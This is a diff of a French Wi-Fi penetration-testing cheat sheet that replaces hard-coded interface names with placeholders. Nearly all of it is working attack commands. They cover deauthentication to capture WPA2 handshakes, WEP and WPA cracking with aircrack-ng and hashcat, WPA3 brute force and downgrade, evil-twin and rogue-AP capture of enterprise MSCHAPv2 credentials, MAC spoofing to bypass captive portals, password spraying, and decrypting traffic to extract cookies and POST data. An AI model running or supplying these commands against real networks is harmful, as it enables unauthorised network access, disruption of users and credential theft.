@@ -19,18 +19,18 @@
 ## Étape 1 : Setup
 
 ```bash
-# Vérifier les interfaces disponibles
+# Lister les interfaces Wi-Fi disponibles
 sudo airmon-ng
+# → noter le nom de l'interface (ex: wlan0, wlp3s0, wlx...)
 
 # Tuer les services qui interfèrent
 sudo airmon-ng check kill
 
-# Activer le mode moniteur
-sudo airmon-ng start wlan0
+# Activer le mode moniteur sur l'interface identifiée
+sudo airmon-ng start <IFACE>
 
-# Vérifier
+# Vérifier : <IFACE>mon doit apparaître
 sudo iwconfig
-# → wlan0mon doit apparaître
 ```
 
 ```bash
@@ -45,7 +45,7 @@ cd ~/wifi
 
 ```bash
 # Scanner toutes les bandes (2.4 + 5 GHz), noter WPS activé, fabricant
-sudo airodump-ng wlan0mon --manufacturer --wps --band abg -w ~/wifi/captures/scan
+sudo airodump-ng <IFACE_MON> --manufacturer --wps --band abg -w ~/wifi/captures/scan
 ```
 
 **Ce que tu notes pour chaque AP cible :**
@@ -101,101 +101,106 @@ ENC = WPA2 ou WPA3 / AUTH = MGT (Enterprise)
 ### OPN
 
 ```bash
-# Connexion réseau ouvert (adapter ssid et interface)
-cat > ~/wifi/open.conf << 'EOF'
+# Connexion réseau ouvert
+cat > ~/wifi/open.conf << EOF
 network={
-    ssid="NOM_DU_RESEAU"
+    ssid="<SSID>"
     key_mgmt=NONE
     scan_ssid=1
 }
 EOF
-sudo wpa_supplicant -D nl80211 -i wlan2 -c ~/wifi/open.conf &
-sudo dhclient wlan2 -v
+sudo wpa_supplicant -D nl80211 -i <IFACE> -c ~/wifi/open.conf &
+sudo dhclient <IFACE> -v
 
 # MAC spoofing (portail captif)
+# <MAC_CIBLE> : MAC d'un client autorisé (vue dans airodump-ng ou arp-scan)
 sudo systemctl stop NetworkManager
-sudo ip link set wlan2 down
-sudo macchanger -m XX:XX:XX:XX:XX:XX wlan2
-sudo ip link set wlan2 up
+sudo ip link set <IFACE> down
+sudo macchanger -m <MAC_CIBLE> <IFACE>
+sudo ip link set <IFACE> up
 ```
 
 ### WEP
 
 ```bash
-# Automatique
-sudo besside-ng -c <CH> -b <BSSID> wlan2 -v
+# Automatique (interface managed)
+sudo besside-ng -c <CH> -b <BSSID> <IFACE> -v
 
-# Manuel
-sudo airodump-ng --bssid <BSSID> -c <CH> -w ~/wifi/captures/wep wlan0mon &
-sudo aireplay-ng --arpreplay -b <BSSID> -h <MAC_SRC> wlan0mon
+# Manuel (interface monitor)
+sudo airodump-ng --bssid <BSSID> -c <CH> -w ~/wifi/captures/wep <IFACE_MON> &
+sudo aireplay-ng --arpreplay -b <BSSID> -h <MAC_SRC> <IFACE_MON>
 sudo aircrack-ng ~/wifi/captures/wep-01.cap
 
-# Connexion après crack
-# Créer wep.conf avec wep_key0=<CLÉ_SANS_DEUX_POINTS>
-sudo wpa_supplicant -D nl80211 -i wlan2 -c ~/wifi/wep.conf
+# Connexion après crack (enlever les ':' de la clé hexadécimale)
+sudo wpa_supplicant -D nl80211 -i <IFACE> -c ~/wifi/wep.conf
 ```
 
 ### WPA2-PSK
 
 ```bash
 # Capture handshake
-sudo airodump-ng --bssid <BSSID> -c <CH> -w ~/wifi/captures/wpa2 wlan0mon &
-sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
+sudo airodump-ng --bssid <BSSID> -c <CH> -w ~/wifi/captures/wpa2 <IFACE_MON> &
+sudo aireplay-ng -0 10 -a <BSSID> <IFACE_MON>
+# Attendre "WPA handshake: <BSSID>" dans airodump-ng
 
 # Crack
-aircrack-ng ~/wifi/captures/wpa2-01.cap -w ~/rockyou-top100000.txt
+aircrack-ng ~/wifi/captures/wpa2-01.cap -w <WORDLIST>
 
-# Evil Twin
-sudo hostapd-mana ~/wifi/hostapd.conf
+# Evil Twin (SSID caché ou client mémorisé)
+sudo hostapd-mana ~/wifi/hostapd-evil.conf
 # Attendre handshake → CTRL+C
-hashcat -a 0 -m 22000 clean.22000 ~/rockyou-top100000.txt --force
-hashcat -m 22000 clean.22000 --show
+hashcat -a 0 -m 22000 ~/wifi/clean.22000 <WORDLIST> --force
+hashcat -m 22000 ~/wifi/clean.22000 --show
 ```
 
 ### WPA3-SAE
 
 ```bash
 # Brute force en ligne
-./wacker.py --wordlist ~/rockyou-top100000.txt \
+# <FREQ> : 2412=CH1, 2437=CH6, 2462=CH11, ou formule 2.4G : 2407 + (CH * 5)
+cd ~/tools/wacker/
+./wacker.py --wordlist <WORDLIST> \
     --ssid <SSID> --bssid <BSSID> \
-    --interface wlan2 --freq <FREQ>
+    --interface <IFACE> --freq <FREQ>
 
 # Downgrade (WPA3+WPA2 mixte, MFP désactivé)
-sudo hostapd-mana ~/wifi/hostapd-wpa2.conf &
-iwconfig wlan0mon channel <CH>
-sudo aireplay-ng -0 0 -a <BSSID_AP> -c <MAC_CLIENT> wlan0mon
-# Récupérer hccapx → hcxhash2cap + hcxpcapngtool → hashcat -m 22000
+sudo hostapd-mana ~/wifi/hostapd-downgrade.conf &
+iwconfig <IFACE_MON> channel <CH>
+sudo aireplay-ng -0 0 -a <BSSID> -c <MAC_CLIENT> <IFACE_MON>
+# hcxhash2cap + hcxpcapngtool → hashcat -m 22000
 ```
 
 ### WPA-Enterprise (MGT)
 
 ```bash
 # Passif : identité EAP
-sudo airodump-ng wlan0mon -w ~/wifi/captures/mgt -c <CH>
+sudo airodump-ng <IFACE_MON> -w ~/wifi/captures/mgt -c <CH>
 wireshark ~/wifi/captures/mgt-01.cap
 # Filtre : eap && eap.code == 2 && eap.identity
 
-# Certificat TLS
+# Certificat TLS (depuis la même capture)
 tshark -r ~/wifi/captures/mgt-01.cap \
     -Y "wlan.bssid == <BSSID> && x509sat.IA5String" \
     -T fields -e x509sat.IA5String
 
 # Méthode EAP
-bash ~/tools/EAP_buster/EAP_buster.sh <SSID> '<DOMAIN>\<USER>' wlan1
+bash ~/tools/EAP_buster/EAP_buster.sh <SSID> '<DOMAIN>\<USER_FICTIF>' <IFACE>
 
 # Rogue AP MSCHAPv2
 cd ~/tools/eaphammer
 python3 ./eaphammer --cert-wizard
-python3 ./eaphammer -i wlan3 --auth wpa-eap --essid <SSID> --creds --negotiate balanced
-# Déauth clients → attendre capture
-cat logs/hostapd-eaphammer.log | grep hashcat | awk '{print $3}' >> hashcat.5500
-hashcat -a 0 -m 5500 hashcat.5500 ~/rockyou-top100000.txt --force
+python3 ./eaphammer -i <IFACE> --auth wpa-eap --essid <SSID> --creds --negotiate balanced
+iwconfig <IFACE_MON> channel <CH>
+sudo aireplay-ng -0 0 -a <BSSID> -c <MAC_CLIENT> <IFACE_MON>
+cat logs/hostapd-eaphammer.log | grep hashcat | awk '{print $3}' >> ~/wifi/mschap.5500
+hashcat -a 0 -m 5500 ~/wifi/mschap.5500 <WORDLIST> --force
 
-# Brute force / spraying
-echo '<DOMAIN>\<USER>' > ~/wifi/creds/users.txt
-./air-hammer.py -i wlan3 -e <SSID> -p ~/rockyou-top100000.txt -u ~/wifi/creds/users.txt
-# Spraying (un seul mot de passe)
-./air-hammer.py -i wlan3 -e <SSID> -P 12345678 -u ~/wifi/creds/users-domaine.txt
+# Brute force (utilisateur connu)
+echo '<DOMAIN>\<USERNAME>' > ~/wifi/creds/target.user
+./air-hammer.py -i <IFACE> -e <SSID> -p <WORDLIST> -u ~/wifi/creds/target.user
+
+# Spraying (un seul mot de passe sur liste d'utilisateurs)
+./air-hammer.py -i <IFACE> -e <SSID> -P <MOT_DE_PASSE> -u ~/wifi/creds/users-domain.txt
 ```
 
 ---
@@ -204,17 +209,18 @@ echo '<DOMAIN>\<USER>' > ~/wifi/creds/users.txt
 
 ```bash
 # Déchiffrer le trafic WPA2 capturé
-airdecap-ng -e <SSID> -p <MOT_DE_PASSE> ~/wifi/captures/wpa2-01.cap
+airdecap-ng -e <SSID> -p <PASSWORD> ~/wifi/captures/wpa2-01.cap
+# Génère : ~/wifi/captures/wpa2-01-dec.cap
 
-# Analyser
+# Analyser dans Wireshark
 wireshark ~/wifi/captures/wpa2-01-dec.cap
-# Filtre HTTP : http
+# Filtre HTTP    : http
 # Filtre cookies : http.cookie
-# Filtre POST : http.request.method == "POST"
+# Filtre POST    : http.request.method == "POST"
 
-# Isolation clients
-sudo arp-scan -I wlan3 -l
-curl http://192.168.X.Y   # accès direct vers un autre client
+# Tester l'isolation entre clients
+sudo arp-scan -I <IFACE> -l
+curl http://<IP_CLIENT>
 ```
 
 ---
@@ -223,8 +229,9 @@ curl http://192.168.X.Y   # accès direct vers un autre client
 
 ```
 Setup
+[ ] airmon-ng → interface identifiée
 [ ] airmon-ng check kill
-[ ] airmon-ng start wlan0 → wlan0mon visible
+[ ] airmon-ng start <IFACE> → <IFACE>mon visible
 [ ] Dossier ~/wifi/ créé
 
 Reconnaissance
@@ -262,7 +269,7 @@ Exploitation post-accès
 
 | Symptôme | Cause probable | Solution |
 |---|---|---|
-| `wlan0mon` n'apparaît pas | Mode moniteur non activé | `airmon-ng check kill` puis `airmon-ng start wlan0` |
+| `<IFACE>mon` n'apparaît pas | Mode moniteur non activé | `airmon-ng` pour trouver l'interface, puis `airmon-ng check kill` + `airmon-ng start <IFACE>` |
 | airodump-ng ne voit aucun réseau | Mauvaise bande scannée | Ajouter `--band abg` |
 | Handshake non capturé | Pas de client actif | `aireplay-ng -0 10 -a <BSSID>` pour forcer la reconnexion |
 | aircrack-ng ne trouve pas | Mot de passe hors dictionnaire | Essayer rockyou complet ou règles hashcat |
